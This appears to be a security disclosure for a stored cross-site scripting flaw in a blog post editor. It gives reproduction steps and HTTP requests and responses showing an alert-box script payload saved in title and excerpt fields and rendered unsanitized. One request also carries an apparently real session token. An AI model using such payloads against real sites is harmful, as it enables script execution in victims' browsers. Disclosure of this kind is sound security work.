
### Stored XSS

To reproduce do the following:

1. Login as normal user account
2. Browse "Blog Posts" -> "Manage Blogs" -> "Add Blog Post"
3. Select "Title" and enter payload "><script>alert(1)</script>

```
// HTTP POST request showing XSS payload

PATCH /admin/api/admin/articles/2dc688b1-ac9e-46d7-8e56-57ded1d45bf5 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
[...]

{"article":{"id":"2dc688b1-ac9e-46d7-8e56-57ded1d45bf5","title":"Title\"><script>alert(1)</script>","excerpt":"Excerpt\"><script>alert(2)</script>","content":"<p>\"&gt;&lt;script&gt;alert(3)&lt;/script&gt;</p>"[...]
```

```
// HTTP response showing unsanitized XSS payload

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
[...]

{"article":{"title":"Title\"><script>alert(1)</script>","excerpt":"Excerpt\"><script>alert(2)</script>","published":true,"seo_title":"Title\"><script>alert(1)</script>"[...]
```

```
// HTTP GET request to trigger XSS payload

GET /blog/titlescriptalert1script?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NzAzMzE5MzYsInN0b3JlX2lkIjo1MTA0NTksInVzZXJfaWQiOiI4NGY4Nzk4ZC03ZGQ1LTRlZGMtYjk3Yy02MWUwODk5ZjM2MDgifQ.9ybPJCtv6Lzf1BlDy-ipoGpXajtl75QdUKEnfj9L49I HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
[...]
```

```
// HTTP response showing unsanitized XSS payload

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
[...]

<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>Title"><script>alert(1)</script></title>
<meta name="keywords" content="test1205">
[...]
```
